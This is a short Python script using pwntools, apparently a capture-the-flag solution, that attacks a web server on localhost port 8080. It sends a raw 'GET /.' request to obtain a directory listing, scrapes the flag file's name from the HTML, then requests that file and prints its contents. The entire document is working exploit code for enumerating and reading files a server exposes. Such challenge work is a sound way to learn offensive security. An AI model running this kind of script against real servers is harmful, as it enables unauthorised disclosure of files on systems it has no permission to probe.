from pwn import *

host = '127.0.0.1'
port = 8080

r = remote(host, port)

def ready(s, **f):
    return s.format(**f).replace('\n','\r\n').encode('utf-8')

def receive(r):
    res = ''
    while True:
        try:
            res += r.recv().decode('utf-8')
        except EOFError:
            break
    return res

r.send(ready("""GET /. HTTP/1.1
Host: {host}
User-Agent: hacker

""", host=host))

res = receive(r)

flag_name = res.split('<div class="file">')[4].split('./')[1].split('">')[0]
print(flag_name)

r = remote(host, port)
r.send(ready("""GET /{path} HTTP/1.1
Host: {host}
User-Agent: hacker

""", path=flag_name, host=host))

flag = receive(r).split('\r\n\r\n')[1]
print(flag)